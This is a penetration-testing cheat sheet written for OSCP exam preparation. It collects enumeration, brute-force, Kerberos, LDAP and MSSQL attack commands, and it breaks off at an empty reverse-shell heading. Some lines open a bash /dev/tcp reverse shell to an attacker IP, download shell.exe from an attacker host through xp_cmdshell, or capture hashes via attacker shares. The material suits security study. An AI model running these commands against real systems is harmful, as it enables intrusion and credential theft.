# OSCP_Cheat_Sheet
<p><h2>This is a collection of tools, commands and quick reference points I've gathered to help pass the OSCP certification</h2></p>

<img width="520" height="600" alt="image" src="https://github.com/user-attachments/assets/3419386e-813b-4697-bd92-36acd8609bea" />

> **Disclaimer:**  
> This cheat sheet is a personal collection of tools and techniques used for educational purposes only.  
> By using this reference, you acknowledge that the content is provided as-is, and **you are solely responsible** for ensuring that any actions taken with this knowledge are **ethical, legal, and in accordance with applicable laws**.  
> **Use at your own risk.**
>
<div style="border: 2px solid #007bff; padding: 15px; background-color: #e7f3fe; color: #0056b3; border-radius: 5px;">
  <h2 style="color: #007bff; font-weight: bold; font-size: 28px;">Note:</h2>
  <p>Before we get into the cheat sheet, these are some quick references for the OSCP exam:</p>
  <ul>
    <li><a href="https://help.offsec.com/hc/en-us/articles/360050299352-Proctoring-Tool-Manual" target="_blank">Proctoring Tool Manual</a></li>
    <li><a href="https://help.offsec.com/hc/en-us/articles/15295546432148-Proctored-Exam-Requirements-FAQ" target="_blank">Proctored Exam Requirements</a></li>
    <li><a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide" target="_blank">OSCP Exam Guide</a></li>
  </ul>
</div>

# **Table of Contents**

1. [Reconaissance](#reconaissance)
   - [NMAP](#nmap)
   - [Rustscan](#rustscan)
   - [Masscan](#masscan)
   - [Powershell](#powershell)
2. [Specific Ports](#specific-ports)
   - [FTP](#ftp)
   - [SSH](#ssh)
   - [Telnet](#telnet)
   - [SMTP](#smtp)
   - [DNS](#dns)
   - [TFTP](#tftp)
   - [Kerberos](#kerberos)
   - [POP3](#pop3)
   - [RPC](#rpc)
   - [MSRPC](#msrpc)
   - [SMB](#smb)
   - [IMAP](#imap)
   - [SNMP](#snmp)
   - [LDAP](#ldap)
   - [MSSQL](#mssql)
   - [MYSQL](#mysql)
   - [MariaDB](#mariadb)
   - [Oracle](#oracle)
   - [NFS](#nfs)
   - [RDP](#rdp)
   - [PostgreSQL](#postgresql)
   - [VNC](#vnc)
   - [WinRM](#winrm)
   - [Redis](#redis)
3. [Web Testing](#web-testing)
   - [Scanners](#scanners)
     - [Nikto](#nikto)
     - [Nuclei](#nuclei)
     - [WPScan](#wpscan)
   - [Curl](#curl)
   - [Directory Discovery](#directory-discovery)
     - [FFUF](#ffuf)
     - [Dirb](#dirb)
     - [Gobuster](#gobuster)
     - [Feroxbuster](#feroxbuster)
     - [Dirsearch](#dirsearch)
     - [WFUZZ](#wfuzz)
     - [Exposed Git](#exposed-git)
     - [Api](#api)
     - [IDOR](#idor)
   - [Wordlists](#wordlists)
     - [Common Wordlists](#common-wordlists)
     - [Cewl](#cewl)
     - [Rules](#rules)
   - [XSS](#xss)
   - [LFI](#lfi)
   - [RFI](#rfi)
   - [Files and Paths for RFI and LFI](#files-and-paths-for-rfi-and-lfi)
   - [Blacklisted Extensions](#blacklisted-extensions)
   - [Bypassing Filters](#bypassing-filters)
   - [Embedding Code](#embedding-code)
3. [SQL](#sql)
   - [Basic Commands](#basic-commands)
   - [SQL Injection](#sql-injection)
     - [Blind](#blind)
     - [Error Based](#error-based)
     - [Union Based](#union-based)
     - [Login Bypass](#login-bypass)
     - [Truncation](#truncation)
4. [SWAKS](#swaks)
5. [Macros](#macros)
   - [LibreOffice](#libreoffice)
   - [Microsoft Word](#microsoft-word)
6. [Msfvenom](#msfvenom)
7. [Brute Forcing](#brute-forcing)
   - [Hydra](#hydra)
   - [John The Ripper](#john-the-ripper)
   - [Hashcat](#hashcat)
8. [Common Credentials](#common-credentials)
9. [CrackMapExec](#crackmapexec)
10. [Netexec](#netexec)
    - [Password Spraying](#password-spraying)
    - [SMB](#smb)
    - [FTP](#ftp)
    - [LDAP](#ldap)
    - [MSSQL](#mssql)
    - [Secrets Dump](#secrets-dump)
11. [Escalation](#escalation)
    - [Windows](#windows)
    - [Linux](#linux)
12. [Active Directory](#active-directory)
    - [Basic Enumeration](#basic-enumeration)
    - [GPO Abuse](#gpo-abuse)
    - [AS-REP Roasting](#as-rep-roasting)
    - [Kerberoasting](#kerberoasting)
    - [Silver Ticket](#silver-ticket)
    - [Golden Ticket](#golden-ticket)
    - [Shadow Copies](#shadow-copies)
    - [Service Binary Hijacking](#service-binary-hijacking)
    - [DLL Hijacking](#dll-hijacking)
    - [DCSync](#dcsync)
13. [Useful Privileges](#useful-privileges)
14. [File Transferring](#file-transferring)
15. [Reverse Shells](#reverse-shells)
16. [Port Forwarding](#port-forwarding)
    - [Chisel](#chisel)
    - [SSH](#ssh)
    - [Ligolo-ng](#ligolo-ng) 
18. [Various Tools](#various-tools)
    - [Mimikatz](#mimikatz)
    - [PowerView](#powerview)
    - [PowerUp](#powerup)
    - [FullPowers](#fullpowers)
    - [PowerMad](#powermad)
    - [Rubeus](#rubeus)
    - [Impacket](#impacket)
    - [Potatoes](#potatoes)
    - [PrintSpoofer](#printspoofer)
    - [Snaffler](#snaffler)


## Reconaissance

---

## NMAP

> **TCP scan**
> ```bash
> sudo nmap -Pn -n <IP Address> -sC -sV -p- --open
> ```
>
> **UDP scan**
>
> ```bash
> sudo nmap -Pn -n <IP Address> -sU --top-ports=100 --reason
> ```

> **SSH Authentication Bypass Detection**
> ```bash
> nmap -p 22 --script=ssh-auth-methods <target_ip>
> ```

> **SSH Brute Force Attack**
> ```bash
> nmap -p 22 --script=ssh-brute --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/wordlists/rockyou.txt <target_ip>
> ```

> **Shellshock Vulnerability check**
> ```bash
> nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
> ```

> **SNMP Brute**
> ```bash
> sudo nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=<community-file> <target-ip>
> ```

> **Kerberos service availability and basic information**
> ```bash
> nmap -p 88 --script kerberos-enum-users <target_ip>
> ```

> **Scan for common Kerberos vulnerabilities**

> ```bash
> nmap -p 88 --script kerberos-brute <target_ip>
> ```

> **Enumerate SPNs**
> ```bash
> nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
> ```

> **SMB**
> ```bash
> nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ip>
> ```

> **Redis**
> ```bash
> nmap -p 6379 --script "redis-info,redis-rce" <ip>
> ```

---

## Rustscan

> [!Note]
**To install rustscan on kali linux**
  - Download the latest release from [Rustscan](https://github.com/RustScan/RustScan/releases)
  - Run dpkg -i on the file

> **Basic scan for all TCP ports**
> ```bash
> rustscan -a <target-ip> -p 1-65535
> ```

> **In conjuncture with NMAP**
> ```bash
> rustscan -a <target-ip> -p 1-65535 -- -Pn
> ```

> **Vulnerability Detection**
> ```bash
> rustscan -a <target-ip> -p 1-65535 -- -sV --script vuln
> ```

---

## Masscan

> **Scanning top ports**
> ```bash
> masscan <IP Address>/24 --top-ports 100
> ```

> **Modifying the speed**
> ```bash
> masscan <IP Address>/24 -p80 --rate 100000
> ```

---

## Powershell

> **Port scan script**
> ```powershell
> 1..1024 % {echo ((New-Object Net.Sockets.TcpClient).Connect("[IP]", $_)) "TCP port $_ is open"} 2>$null
> ```

---

## Specific Ports

---

## FTP
> Anonymous Authentication and Modes  
>  
> **Common FTP Credentials**  
> - **Username**: `anonymous`
> - **Password**: `anonymous`
>  
> **Switching to Passive Mode**  
> To enable passive mode, use the command:
> 
> ```bash
> passive
> ```
>  
> **Switching to Binary Mode**  
> To switch to binary mode, use the command:
> 
> ```bash
> binary
> ```
>
> **Uploading a file to server**
> ```bash
> put <file-to-upload>
> ```
>
> **Download a file from the server**
> ```bash
> get <file-to-download>
> ```
>

**Common FTP Commands**

| Command | Description                   | Usage                   |
|---------|-------------------------------|-------------------------|
| `lcd`   | Change local directory.        | `lcd /path/to/directory` |
| `cd`    | Change server directory.       | `cd /path/to/directory`  |
| `ls`    | List server directory files.   | `ls`                     |
| `get`   | Download file from server.     | `get filename.txt`       |
| `mget`  | Download multiple files.       | `mget *.txt`             |
| `put`   | Upload file to server.         | `put filename.txt`       |
| `mput`  | Upload multiple files.         | `mput *.txt`             |
| `bin`   | Set binary transfer mode.      | `bin`                    |
| `ascii` | Set ASCII transfer mode.       | `ascii`                  |
| `quit`  | Exit FTP client.               | `quit`                   |

---

## SSH

> **Basic syntax**
> ```bash
> ssh username@<IP Address>
> ```

> **Using id_rsa**
> ```bash
> ssh -i id_rsa username@<IP Address>
> ```

> **Bypass Host key checking**
> ```bash
> ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@target_ip
> ```

> **Force a different cipher**
> ```bash
> ssh -c aes128-cbc user@target_ip
> ```

> **Force an older SSH version**
> ```bash
> ssh -2 user@target_ip
> ```

> **SSH Reverse Shell with weak Cryptographic Algorithms**
> ```bash
> ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa <user>@<target_ip> -t 'bash -i >& /dev/tcp/<attacker_ip>/443 0>&1'
> ```
>  - Make sure to have a listener ready

> **Finding SSH Keys**
> ```bash
> find /etc/ssh -name "*.pub"
> find /home/<user>/.ssh -name "id_*"
> ```

> **Creating new key pai**
> ```bash
> ssh-keygen -t rsa
> ```

> **Modify permissions for id_rsa**
> ```bash
> chmod 600 id_rsa
> ```

---

 ## Telnet

> **Basic login**
> ```bash
> telnet <target_ip> 23
> ```

> **With username**
> ```bash
> telnet -l <username> <target_ip>
> ```

---

## SMTP

> **User Enumeration**
> ```bash
> smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP Address>
> ```

> **Connection**
> ```bash
> telnet <IP Address> 25
> ```

**Common SMTP Commands**

| Command   | Description      | Usage                              |
|-----------|------------------|------------------------------------|
| `HELO`    | Identify client  | `HELO client.com`                  |
| `EHLO`    | Extended HELO    | `EHLO client.com`                  |
| `MAIL FROM` | Sender address  | `MAIL FROM:<sender@domain.com>`    |
| `RCPT TO` | Recipient        | `RCPT TO:<recipient@domain.com>`   |
| `DATA`    | Message content  | `DATA`                             |
| `VRFY`    | Verify user      | `VRFY admin`                       |
| `EXPN`    | Expand list      | `EXPN all`                         |
| `RSET`    | Reset            | `RSET`                             |
| `NOOP`    | No operation     | `NOOP`                             |
| `QUIT`    | Close            | `QUIT`                             |

---

## DNS

**Enumeration**

> **Using Dig**
> ```bash
> dig <IP Address>
>```
> **For Reverse DNS**
> ```bash
> dig -X <IP Address>
> ```

> **Using nslookup**
> ```text
> nslookup
> > server <dns_server_ip>
> > set type=any
> > <domain_name>  # Query any records
> ```

> **dnsenum**
> ```bash
> dnsenum --dnsserver <DNS_IP> --enum -p 0 -s 0 -o subdomains.txt -f <WORDLIST> <DOMAIN>
> ```
> ```bash
> dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver <dns_server_ip> <domain_name>
> ```

> **DNS Zone Transfer**
> ```bash
> dnsrecon -d <domain_name> -n <dns_server_ip> -t axfr
> ```

> **DNS Cache Snooping**
> ```bash
> dnsrecon -t std -d hackviser.com -D /usr/share/dnsrecon/namelist.txt
> ```
> ```bash
> dig @<dns_server_ip> -t A +norecurse <target_domain>
> ```

> **Enumerating with Powershell**
> ```powershell
> Resolve-DnsName -Name <domain_name> -Server <dns_server_ip> -DnsOnly
> ```

---

## TFTP

### What is TFTP?

TFTP (Trivial File Transfer Protocol) is a simple, lightweight protocol that operates over UDP. Unlike FTP, it does not require authentication or complex commands. TFTP is typically used for transferring small files like configuration files or firmware, often in environments where simplicity and speed are critical.

### TFTP in Pentesting: A Double-Edged Sword

While TFTP is simple, it can be a **double-edged sword** in penetration testing. On one hand, it's a great tool for quickly transferring files in environments with limited resources or restrictions. On the other hand, if misconfigured, TFTP servers can be **exploited by attackers** to exfiltrate data or upload malicious files to a vulnerable server.

#### Common Uses in Pentesting:
- **Exfiltration**: Attackers may use TFTP to transfer sensitive data from compromised systems to an external server.
- **Firmware Upload**: Many IoT and networking devices use TFTP for firmware updates. Vulnerabilities in this process can allow attackers to upload malicious firmware.
- **Simplicity**: The lack of authentication in TFTP makes it an attractive attack vector for pentesters when targeting poorly configured devices.

### Example Usage:

You can use TFTP to download or upload files to/from a server. Here's a basic example to download a file:

```bash
tftp <target_ip>
tftp> get <file_name>
```
```bash
tftp <target_ip>
tftp> put <file_name>
```
> [!Note]
> For more information, reference [Hackvisor TFTP](https://hackviser.com/tactics/pentesting/services/tftp)

---

## Kerberos

**Kerberos Ticket Types**

| Ticket         | Description            | Use Case               |
|----------------|------------------------|------------------------|
| `TGT`          | Ticket Granting Ticket  | Initial authentication |
| `TGS`          | Ticket Granting Service | Service access         |
| `Golden Ticket`| Forged TGT             | Full domain access     |
| `Silver Ticket`| Forged TGS             | Specific service access|

**Useful Tools**

| Tool            | Description            | Use Case               |
|-----------------|------------------------|------------------------|
| [Kerbrute](https://github.com/ropnop/kerbrute/releases)     | Kerberos enumeration    | Username/password spraying |
| [Rubeus](https://github.com/GhostPack/Rubeus)  | Kerberos attack tool    | Windows-based attacks   |
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Credential dumper       | Ticket manipulation     |
| `Impacket`      | Python toolkit          | Various Kerberos attacks |
| `hashcat`       | Password cracker        | Ticket cracking         |
| `John the Ripper` | Password cracker      | Hash cracking           |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) | AD enumeration          | Domain reconnaissance   |

**Using kinit**
> - Request ticket granting ticket
> ```bash
> kinit username@DOMAIN.COM
> ```
> - With a password
> ```bash
> echo 'password' | kinit username@DOMAIN.COM
> ```
> - Check Tickets
> ```bash
> klist
> ```
> - Destroy Tickets
> ```bash
> kdestroy
> ```

**Connecting using Impacket**
> - Get the ticket
> ```bash
> impacket-getTGT DOMAIN/username:password
> ```
> - Use the ticket
> ```bash
> export KRB5CCNAME=username.ccache
> ```
> - Request Service Ticket
> ```bash
> impacket-getST -spn service/hostname DOMAIN/username -k -no-pass

**Using Kerbrute**
> - Username Enumeration
>```bash
> ./kerbrute userenum -d [ DC-IP ] usernames.txt
>```
> - Password Spray
> ```bash
> ./kerbrute passwordspray -d [ DC-IP ] domain_users.txt <password>
> ```
> - Brute User
> ```bash
> bruteuser -d [ DC-IP ] passwords.lst [ target-username ]
> ```

>[!Note]
> - For more detailed guide of [Kerbrute](https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/)
> - For more detailed guide of [Rubeus](https://www.hackingarticles.in/a-detailed-guide-on-rubeus/)

---

## POP3

**Common POP3 Commands**

| Command | Description            | Usage                   |
|---------|------------------------|-------------------------|
| `USER`  | Username               | `USER username`         |
| `PASS`  | Password               | `PASS password`         |
| `STAT`  | Mailbox stats          | `STAT`                  |
| `LIST`  | List messages          | `LIST`                  |
| `RETR`  | Retrieve message       | `RETR 1`                |
| `DELE`  | Mark for deletion      | `DELE 1`                |
| `NOOP`  | No operation           | `NOOP`                  |
| `RSET`  | Reset                  | `RSET`                  |
| `TOP`   | Message header + lines | `TOP 1 10`              |
| `UIDL`  | Unique IDs             | `UIDL`                  |
| `QUIT`  | Close connection       | `QUIT`                  |

**Connecting to POP3**
 - Telnet
> ```bash
> telnet <IP Address> 110
> ```
 - OpenSSL for POP3S
> ```bash
> openssl s_client -connect <IP Address>:995 -crlf -quiet
> ```
 - Curl
> - Reading Emails
> ```bash
> curl -u username:password pop3://<IP Address>/
> ```
> - Read specific email
> ```bash
> curl -u username:password pop3://<IP Address>/1
> ```
> - POP3s
> ```bash
> curl -u username:password pop3s://<IP Address>/ --insecure
> ```

---

## RPC

**Connecting**
>```bash
> nc -z -v -u <IP Address> 111

**Recon**
>```bash
>rpcinfo -p <IP Address>
>```

**Enumeration**
>```bash
>rpcenum -v <IP Address>
>```

**Create an RPC bridge**
>```bash
>rpcclient -U "username%password" <IP Address>
>```

---

## MSRPC

**Enumeration using impacket**
> ```bash
> impacket-rpcdump <IP Address> -p 135
> ```

**Using Rpcclient**

**Rpcclient Commands**

| Command              | Description                     |
|----------------------|---------------------------------|
| `enumdomusers`        | Enumerates domain users         |
| `enumdomgroups`       | Enumerates domain groups        |
| `queryuser 0x450`     | Queries a user by SID           |
| `enumprinters`        | Enumerates printers             |
| `querydominfo`        | Queries domain information      |
| `createdomuser`       | Creates a new domain user       |
| `deletedomuser`       | Deletes a domain user           |
| `lookupnames`         | Looks up names from SID         |
| `lookupsids`          | Looks up SID from names         |
| `lsaaddacctrights`    | Adds account rights             |
| `lsaremoveacctrights` | Removes account rights          |
| `dsroledominfo`       | Displays domain role information|
| `dsenumdomtrusts`     | Enumerates domain trusts        |

> - Connect with a null session
> ```bash
> rpcclient -U "" -N <IP Address>
> ```

> - Connect to the target and list available shares
> ```bash
> rpcclient -U "" -N <IP Address> -c "srvinfo"
> ```

> - List all available users
> ```bash
> rpcclient -U "" -N <IP Address> -c "enumdomusers"
> ```

> - Enumerate domain groups
> ```bash
> rpcclient -U "" -N <IP Address> -c "enumdomgroups"
> ```

> - Query user information
> ```bash
> rpcclient -U "<username>" -W "<domain>" <IP Address> -c "queryuser <username>"
> ```

---

## SMB

**Enumeration**
- smbmap
> ```bash
> smbmap -H <IP Address>
> ```
> ```bash
> smbmap -u '' -p '' -H <IP Address>

- smbclient
> - List shares without a password
> ```bash
> smbclient -N -L //<IP Address>
> ```
> - Connecting with username and password
> ```bash
> smbclient -U '<username>' -P '<password>' //<IP Address>
> ```
> - Downloading files from login (Make sure to change timeout for larger files)
> ```bash
> smbclient //<IP Address>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
> ```

- Enum4Linux
> - Basic Enumeration
> ```bash
> enum4linux -a <IP Address>
> ```
> - Extract Domain Users
> ```bash
> enum4linux -U <DOMAIN_IP>
> ```
> - Extract all Domain Shares
> ```bash
> enum4linux -S <IP Address>
> enum4linux -a -M -l -d <IP Address> 2>&1
> ```

-Mounting SMB Shares
> ```bash
> mkdir /tmp/share
> sudo mount -t cifs //<IP Address>/<SHARE> /tmp/share
> or
> sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP Address>/<SHARE> /tmp/share

---

## IMAP

**Common Commands**

| Command   | Description        | Usage                        |
|-----------|--------------------|------------------------------|
| `CAPABILITY` | List capabilities  | `a1 CAPABILITY`              |
| `LOGIN`       | Authenticate       | `a1 LOGIN user pass`         |
| `LIST`        | List mailboxes     | `a1 LIST "" "*"`             |
| `SELECT`      | Select mailbox     | `a1 SELECT INBOX`            |
| `FETCH`       | Retrieve messages  | `a1 FETCH 1 BODY[]`          |
| `SEARCH`      | Search messages    | `a1 SEARCH TEXT "keyword"`   |
| `STORE`       | Modify flags       | `a1 STORE 1 +FLAGS \Deleted` |
| `LOGOUT`      | Close session      | `a1 LOGOUT`                  |

**Connecting**
> ```bash
> telnet <IP Address> 143
> ```

**Read all Emails**
> ```text
> a1 LOGIN username password
>a2 SELECT INBOX
>a3 FETCH 1:* (BODY[])
> ```

**Searching for Specific content**
> ```text
> a4 SEARCH SUBJECT "password"
> a5 SEARCH FROM "admin@target.com"
> a6 SEARCH TEXT "confidential"
> ```

**Keyword Search**
>```text
> SEARCH TEXT "password"
> SEARCH TEXT "credential"
> SEARCH TEXT "confidential"
> SEARCH SUBJECT "reset"
> ```

---

## SNMP

**Basic Enumeration**
- #### Versions = 1, 2c, 3
> ```bash
> snmpwalk -v <SNMP_VERSION> -c <COMMUNITY_STRING> <IP Address>
> ```

**Using hydra to discover the community string**
> ```bash
> hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt snmp://<IP Address>
> ```

**Using snmpwalk to discover passwords**
> ```bash
> snmpwalk -v 2c -c security <IP Address> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
> ```

---

## LDAP

**ldapsearch basic enumeration**

### Basic LDAP query
> ```bash
> ldapsearch -x -H ldap://<target_ip>
> ```
### Basic LDAP Search for a base-level
> ```bash
> ldapsearch -h <target_ip> -x -s base
> ```
### Get Naming Contexts
> ```bash
> ldapsearch -x -H ldap://<target_ip> -s base namingcontexts
> ```
### Search in a Specific Base Domain Name
> ```bash
> ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>"
> ```
### Enumerate users using LDAP
>```bash
> ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass=*)"
> ```
### Retrieve users Account Name
> ```bash
> ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass*)" | grep sAMAccountName:
> ```
### Search with Filters
> ```bash
> ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=user)"
> ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=group)"
> ```
### Searching with authentication
> ```bash
> ldapsearch -h <target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>"
> ```
### Searching terms
> ```bash
> ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>"
> ```
### Specifies the value term to return
> ```bash
> ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>" <additionalTerm>

**Useful Search Terms**

| **Description**                                                                 | **Search Term**                                                                          |
| ------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| **Search for ms-MCS-AdmPwd (local administrator passwords)**                    | `(ms-MCS-AdmPwd=*)`                                                                      |
| **Search for attributes containing 'password' in description**                  | `(description=*password*)`                                                               |
| **Search for LAPS expiration time (to identify potential password management)** | `(ms-MCS-AdmPwdExpirationTime=*)`                                                        |
| **Search for common weak passwords in attributes like description**             | `(description=*(123456*|password*|qwerty*|letmein*))` |
| **Search for All Users**                                                        | `(objectClass=user)`                                                                     |
| **Search for All Computers**                                                    | `(objectClass=computer)`                                                                 |
| **Search for All Groups**                                                       | `(objectClass=group)`                                                                    |
| **Search for Disabled Accounts**                                                | `(userAccountControl:1.2.840.113556.1.4.803:=2)`                                         |
| **Search for Expired Accounts**                                                 | `(& (objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!(pwdLastSet=0)))` |
| **Search for Specific Group Membership**                                        | `(&(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))`                |
| **For users with a specific email domain**                                      | `(mail=*@example.com)`                                                                   |
| **For users with a specific title**                                             | `(title=Manager)`                                                                        |
| **Search for Password Last Set**                                                | `(pwdLastSet=*)`                                                                         |
| **Search for Accounts with Expired Passwords**                                  | `(& (objectClass=user)(pwdLastSet<=0))`                                                  |
| **Search for Accounts in a Specific Organizational Unit (OU)**                  | `(distinguishedName=*,OU=Sales,DC=domain,DC=com)`                                        |
| **Search for Accounts with Kerberos Pre-Authentication Disabled**               | `(userAccountControl:1.2.840.113556.1.4.803:=4194304)`                                   |
| **Search for Service Principal Names (SPNs)**                                   | `(servicePrincipalName=*)`                                                               |
| **Search for Delegated Users**                                                  | `(msDS-AllowedToDelegateTo=*)`                                                           |
| **Search for Accounts with Privileges**                                         | `(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)`                                  |
| **Search for All Organizational Units**                                         | `(objectClass=organizationalUnit)`                                                       |
| **Search for Active Directory Certificate Services**                            | `(objectClass=cACertificate)`                                                            |
| **Search for All Attributes of a Specific User**                                | `(sAMAccountName=username)`                                                              |
| **Search for Accounts with Specific Notes or Descriptions**                     | `(description=*keyword*)`                                                                |
| **Search for all objects in the directory**                                     | `(objectClass=*)`                                                                        |
| **Search for service accounts**                                                 | `(objectCategory=serviceAccount)`                                                        |
| **Search for accounts with specific group memberships (replace 'GroupName')**   | `(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)`                                     |
| **Search for computer accounts**                                                | `(objectClass=computer)`                                                                 |
| **Search for users in a specific organizational unit (replace 'OU=Users')**     | `(ou=OU=Users,DC=domain,DC=com)`                                                         |
| **Search for all accounts with specific attributes**                            | `(pwdLastSet=0)`                                                                         |

---

## MSSQL

**Common Procedures**

| Procedure                | Description                       | Requires Admin |
|--------------------------|-----------------------------------|----------------|
| xp_cmdshell              | Execute OS commands               | Yes            |
| sp_configure             | Configure server options          | Yes            |
| xp_dirtree               | List directory contents           | No             |
| xp_fileexist             | Check file existence              | No             |
| xp_subdirs               | List subdirectories               | No             |
| sp_linkedservers         | List linked servers               | No             |
| sp_addlinkedsrvlogin     | Add linked server login           | Yes            |
| OPENROWSET               | Query remote data source          | Varies         |
| BULK INSERT              | Import data from file            | Varies         |

**Default Credentials**
> - Common default credentials
> ```text
> sa:<blank>
> sa:sa
> sa:password
> sa:Password123
> sa:P@ssw0rd
> ```
**Connecting**
### Using impacket
> - Windows authentication
> ```bash
> impacket-mssqlclient DOMAIN/username:password@<IP Address>
> ```
> - SQL authentication
> ```bash
> impacket-mssqlclient sa:password@<IP Address>.com -windows-auth
> ```
> - With specific database
> ```bash
> impacket-mssqlclient username:password@<IP Address> -db master
> ```
> - Using hash (Pass-the-Hash)
> ```bash
> impacket-mssqlclient.py username@<IP Address> -hashes :NTHASH
> ```
### Using sqsh
> - Connect with SQL authentication
> ```bash
> sqsh -S <IP Address> -U sa -P password
> ```
> - Connect with Windows authentication
> ```bash
> sqsh -S <IP Address> -U DOMAIN\\username -P password
> ```

**Enumeration**
### Version Detection
> - Get SQL Server version
> ```sql
> SELECT @@version;
> ```
> - Get product version
> ```sql
> SELECT SERVERPROPERTY('ProductVersion');
> SELECT SERVERPROPERTY('ProductLevel');
> SELECT SERVERPROPERTY('Edition');
> ```
> - Get machine name
> ```sql
> SELECT @@SERVERNAME;
> SELECT SERVERPROPERTY('MachineName');
> ```
### Database Enumeration
> - List all databases
> ```sql
> SELECT name FROM sys.databases;
> SELECT name FROM master.dbo.sysdatabases;
> ```
> - Current database
> ```sql
> SELECT DB_NAME();
> ```
> - Database information
> ```sql
> SELECT name, database_id, create_date
> FROM sys.databases;
> ```
> - Database size
> ```sql
> EXEC sp_helpdb;
> ```
- User Enumeration
> - List all users
> ```sql
> SELECT name FROM master.sys.server_principals;
> SELECT name FROM sys.sysusers;
>```
> - Current user
> ```sql
> SELECT USER_NAME();
> SELECT SYSTEM_USER;
> SELECT CURRENT_USER;
> ```
> - User privileges
> ```sql
> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
> ```
> - List sysadmin users
> ```sql
> SELECT name FROM master.sys.server_principals 
> WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
> ```
### Table and Column Enumeration
> - List tables in current database
> ```sql
> SELECT table_name FROM information_schema.tables;
> ```
> - List all columns in a table
> ```sql
> SELECT column_name, data_type 
> FROM information_schema.columns 
> WHERE table_name = 'users';
> ```
> - Search for specific column names
> ```sql
> SELECT table_name, column_name 
> FROM information_schema.columns 
> WHERE column_name LIKE '%password%';
> ```
> - Count rows in tables
> ```sql
> SELECT t.name, p.rows 
> FROM sys.tables t
> INNER JOIN sys.partitions p ON t.object_id = p.object_id
> WHERE p.index_id < 2;
> ```
### Privilege Enumeration
> - Check if current user is sysadmin
> ```sql
> SELECT IS_SRVROLEMEMBER('sysadmin');
> ```
> - Check server roles
> ```sql
> SELECT name FROM master.sys.server_principals 
> WHERE type = 'R';
> ```
> - Current user permissions
> ```sql
> EXEC sp_helprotect;
> ```
> - Database role members
> ```sql
> EXEC sp_helprolemember;
> ```
### xp_cmdshell
> - Enabling
> ```sql
> EXEC sp_configure 'show advanced options', 1;
> RECONFIGURE;
> EXEC sp_configure 'xp_cmdshell', 1;
> RECONFIGURE;
> ```
### Use and persistence
> ```sql
> EXEC xp_cmdshell 'whoami';
> ```
> - Disable xp_cmdshell (for stealth)
> ```sql
> EXEC sp_configure 'xp_cmdshell', 0;
> RECONFIGURE;
> ```
> - Read file
> ```sql
> EXEC xp_cmdshell 'type C:\Windows\win.ini';
> ```
> - Write file
> ```sql
> EXEC xp_cmdshell 'echo test > C:\Temp\test.txt';
> ```
> - Copy file
> ```sql
> EXEC xp_cmdshell 'copy C:\source.txt C:\dest.txt';
> ```
> - Download file
> ```sql
> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://<attacker IP>/shell.exe -OutFile C:\Temp\shell.exe"';
> ```
### Capturing hashes
> - Start Responder on attacker machine
> ```bash
> sudo responder -I eth0
> ```
> - On MSSQL
> ```sql
> EXEC xp_dirtree '\\<attacker IP>\share';
> EXEC xp_fileexist '\\<attacker IP>\share\file';
> ```
> - Or using xp_subdirs
> ```sql
> EXEC master..xp_subdirs '\\attacker-ip\share';
> ```
> - Or Extract password hashes once logged in (requires sysadmin)
> ```sql
> SELECT name, password_hash FROM sys.sql_logins;
> ```
> - Crack the hash
> ```bash
> hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
> ```
### Impersonation Attacks
> - Check for impersonation permissions
> ```sql
> SELECT distinct b.name
> FROM sys.server_permissions a
> INNER JOIN sys.server_principals b
> ON a.grantor_principal_id = b.principal_id
> WHERE a.permission_name = 'IMPERSONATE';
> ```
> - Impersonate sysadmin user
> ```sql
> EXECUTE AS LOGIN = 'sa';
> SELECT SYSTEM_USER;
> SELECT IS_SRVROLEMEMBER('sysadmin');
> ```
> - Execute as different user
> ```sql
> EXECUTE AS USER = 'admin_user';
> ```
> - Revert to original context
> ```sql
> REVERT;
> ```
- Reverse Shell
> ```sql
